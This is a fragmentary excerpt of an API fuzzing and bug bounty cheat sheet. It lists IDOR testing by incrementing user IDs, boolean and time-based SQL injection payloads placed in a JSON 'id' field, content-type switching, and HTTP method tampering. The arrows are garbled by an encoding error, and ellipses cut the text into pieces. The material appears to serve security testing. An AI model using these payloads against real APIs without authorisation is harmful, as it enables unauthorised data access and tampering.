...
source_group: skills
imported_from: api-fuzzing-bug-bounty.md
metadata:
  author: zebbern
  version: "1.1"
---
...
# If no rate limit Ã¢â€ â€™ brute force possible
...
```bash
# Basic IDOR
GET /api/users/1234 Ã¢â€ â€™ GET /api/users/1235
...
```json
{"id":"56456"}                    Ã¢â€ â€™ OK
{"id":"56456 AND 1=1#"}           Ã¢â€ â€™ OK  
{"id":"56456 AND 1=2#"}           Ã¢â€ â€™ OK
{"id":"56456 AND 1=3#"}           Ã¢â€ â€™ ERROR (vulnerable!)
{"id":"56456 AND sleep(15)#"}     Ã¢â€ â€™ SLEEP 15 SEC
```
...
# Switch content type
Content-Type: application/json Ã¢â€ â€™ application/xml
```
...
/api/v1/users/sensitivedata Ã¢â€ â€™ 403
...
| HTTP Method Tampering | GETÃ¢â€ â€™DELETE/PUT abuse |
...
| Method Tampering | GETÃ¢â€ â€™DELETE | High |
